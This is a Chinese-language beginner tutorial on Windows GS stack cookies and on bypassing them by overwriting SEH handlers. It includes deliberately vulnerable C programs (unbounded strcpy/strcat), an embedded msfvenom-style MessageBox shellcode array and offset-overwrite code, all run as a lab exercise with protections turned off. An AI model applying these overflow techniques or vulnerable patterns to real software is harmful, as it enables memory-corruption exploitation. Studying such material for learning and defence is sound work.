
```c
//0x77528A50
char shellcode[] =
"\x50\x8A\x52\x77\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x18\x30\x40";
```

重新编译，运行，调试，跟踪，程序来到了nop区执行，代表着成功利用

![](upload/attach/202205/930159_KA74QRMNGNNEMP3.png)

# 前言

我是逆向练习生，羽墨。

我正在从0开始学习二进制漏洞，如果你也跟我一样，不妨来看看小白学习的第一视角

---

# 栈中的守护天使：GS

## GS原理

- 向栈内压入一个随机的DWORD值，这个随机数被称为canary，IDA称为 Security Cookie
- Security Cookie 放入 `ebp`前，并且data节中存放一个 Security Cookie的副本
- 栈中发生溢出时，Security Cookie首先被淹没，之后才是`ebp`和返回地址
- 函数返回之前，会添加一个Security Cookie验证操作，称为Security Check
- Security Check过程中，比较栈中的Security Cookie与data节中的副本，如果不吻合，则栈中发生了溢出
- 检测到溢出时，系统将进入异常处理流程，函数不会正常返回，`ret`也不会被执行
- 在VS2005以后的版本，添加了变量重排技术，把缓冲区放到最下面，防止溢出到变量中，同时还把指针参数和字符串参数复制到栈顶，防止函数参数被破坏

## Security Cookie的生成

- 系统以data节的第一个 DWORD值作为Cookie种子，或称为原始Cookie（所有函数的Cookie都用它生成）
- 程序每次运行，种子都不同，具有很强的随机性
- 在栈帧初始化以后，用`ebp xor` 种子 ，作为当前函数的Cookie，以此作为不同函数的区别，并增加随机性
- 函数返回前，用`ebp` 还原出 Cookie 种子 ，进行比较

## GS不会被应用的情况

- 函数不包含缓冲区
- 函数被定义为具有变量参数列表
- 函数使用无保护的关键字标记
- 函数在第一个语句中内联汇编代码
- 缓冲区不是8字节类型 且 大小不大于4个字节
- 编译指令 `#pragma strict_gs_check(on)` 可以为函数强制启用GS

## 逆向分析GS

1. 用C语言写一个简单的程序，开启GS编译选项，Release编译，观察一下汇编代码（没有GS的汇编代码相信读者已经在之前的章节中看过了）

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11 | `#include <stdio.h>` `#include <Windows.h>` `int` `main(` `int` `arc, char`*` *` `argv)` `{` `char szBuff[100]` `=` `{` `0` `};` `strcpy(szBuff, argv[1]);` `printf("%s\n", szBuff);` `return` `0;` `}` |

![](https://bbs.kanxue.com/upload/attach/202205/930159_MGMJH27K6JHC4JE.png)

2. 生成exe后，ida打开

![](https://bbs.kanxue.com/upload/attach/202205/930159_PEZV9D4EFK7QGW2.png)

可以看到，把安全cookie给`eax`， 与 `ebp`异或后， 放入栈中`ebp-4`的位置 ，然后再去函数末尾看一下

![](https://bbs.kanxue.com/upload/attach/202205/930159_Q2S5GJJH7K856U2.png)

可以看到，在`printf`调用后， 把栈中的 cookie拿出来给`ecx` ， `ecx`与`ebp`异或后， 调用了一个函数

这个函数就是检查cookie的函数Security Check ， 先把结果与.data节中的原始 cookie进行比较 ， 如果相同则正常返回， 如果不同则跳转

然后继续跟着跳转往下看，可以看到最后调用了这个函数

![](https://bbs.kanxue.com/upload/attach/202205/930159_5S3PUWPZABRX7S2.png)

这里的`ExceptionInfo`是异常处理需要的结构体，可以在前面看到被赋值，看一下最后的函数调用

![](https://bbs.kanxue.com/upload/attach/202205/930159_GV8AUY9AM9PA56R.png)

最后这个函数设置了一个空的异常处理函数，之后调用系统自己的异常处理函数，并传入之前的`ExceptionInfo`，之后获取当前进程后强制结束

看一下cookie，确实在.data节中， 并且是一个随机值（读者可以调试打开查看，IDA是静态分析工具，cookie会在进入主函数前初始化）

![](https://bbs.kanxue.com/upload/attach/202205/930159_JBESU7GTMAHQDJ4.png)

3. 也就是说，如果cookie被覆盖，则不会按照原来流程返回到被覆盖的 `retaddr` ，验证了前面的原理部分
4. 变量重排比较好理解，因为一般栈空间是按照你的变量顺序来的，重排后，把缓冲区放到距离cookie最近的地方，防止溢出到关键变量，但是没有溢出到cookie的情况
5. 根据以上总结与分析，硬刚GS还是比较困难的，所以我们不得不研究绕过GS的办法

# 绕过GS的方式

这里提出四点，我们实践两点，2与3 ， 1与4是理论上可行的，但是实际环境几乎不可能

- 利用未被保护的内存突破GS
- 覆盖虚函数突破GS
- 攻击SEH突破GS
- 同时替换栈中和.data中的Cookie突破GS（硬刚覆盖返回地址）

## 攻击SEH突破GS

1. 使用C语言写一个测试程序

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29 | `#include <stdio.h>` `#include <Windows.h>` `void __stdcall test(char`* `str``, char`* `out)` `{` `char buf[200]` `=` `{` `0` `};` `__try` `{` `strcpy(buf, str);` `strcpy(out, buf);` `}` `__except (1)` `{` `printf("Error OverFlow\n");` `}` `}` `int` `main(int arc, char`*` *` argv)` `{` `char buf1[500];` `memset(buf1, 0x90, 1000);` `char buf2[100]` `=` `{` `0` `};` `test(buf1, buf2);` `return` `0;` `}` |

代码简要解释 ： `test`是一个溢出函数 且 注册了SEH ， 把`buf1` 的 500字节的数据 放入 `test`函数中的200字节大小的缓冲区中， 此时会造成溢出，溢出后会覆盖到 `out` 的地址（参数地址 `ebp + n`），然后再次拷贝`buf`到`out` 的过程中 ， 会触发非法访问，转入异常处理流程，但是此时函数并没有执行到返回，也就是没有执行到 check cookie函数， 所以可以覆盖SEH来实现绕过 GS

2. 开启GS选项，关闭SafeSEH DEP ASLR选项与优化，生成exe，调试器打开查看， 查看后发现，SEH被编译器扩展（不展开分析）

好的好的，调试器定位一下`test`函数，在经过第一次`strcpy`后，查看SEH链 ，之后继续运行， 访问`90909090`产生异常

![](https://bbs.kanxue.com/upload/attach/202205/930159_4RQ9BYMXCKRMMU5.png)

这个可以证明，攻击SEH是可行的，但是如果你想攻击这个程序，你还得考虑绕过SafeSEH（主模块的地址包含00，无法利用）

3. 修改一下测试代码 ，加入shellcode ，用来展示利用过程，溢出到系统的异常处理， 可以使用 `msfvenom`生成（参考上篇）

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42 | `#include <stdio.h>` `#include <Windows.h>` `unsigned char shellcode[500]` `=` `"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"` `"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"` `"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"` `"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"` `"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"` `"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"` `"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"` `"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"` `"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"` `"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"` `"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"` `"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"` `"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"` `"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"` `"\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"` `"\x68\x58\x20\x20\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20"` `"\x68\x6f\x2c\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c\x24"` `"\x10\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"` `"\x55\x08";` `void  __stdcall test(char`* `input)` `{` `char buf[200];` `strcpy(buf, input);` `strcat(buf, input);` `}` `int` `main(int arc, char`*` *` argv)` `{` `memset(shellcode + strlen(shellcode), 0x90, sizeof(shellcode) - strlen(shellcode));` `test(shellcode);` `}` `//代码的简单解释` `//还是之前的原理，溢出到参数列表，造成strcat访问异常，导致程序进入异常处理` `//但是我们没有自己生成SEH，而是溢出到系统的SEH结构，这样可以避免我们在这个知识点中关心SafeSEH的绕过` |

![](https://bbs.kanxue.com/upload/attach/202205/930159_T82ACBFMSEU7K93.png)

4. 在shellcode中，确定偏移后，覆盖系统的Handler即可

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41 | `#include <stdio.h>` `#include <Windows.h>` `unsigned char shellcode[500]` `=` `"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"` `"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"` `"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"` `"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"` `"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"` `"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"` `"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"` `"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"` `"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"` `"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"` `"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"` `"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"` `"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"` `"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"` `"\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"` `"\x68\x58\x20\x20\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20"` `"\x68\x6f\x2c\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c\x24"` `"\x10\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"` `"\x55\x08\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";` `void  __stdcall test(char`* `input)` `{` `char buf[200];` `strcpy(buf, input);` `strcat(buf, input);` `}` `int` `main(int arc, char`*` *` argv)` `{` `int len = strlen(shellcode);` `memset(shellcode + strlen(shellcode), 0x90, sizeof(shellcode) - strlen(shellcode));` `int`* `ptr = &shellcode[len];` `*ptr = &shellcode;` `test(shellcode);` `}` |

运行进行测试，可以看到拷贝后，刚好覆盖到handler

# 结语

1. 希望本文能帮助到像我一样的新手

# 参考资料

0day2
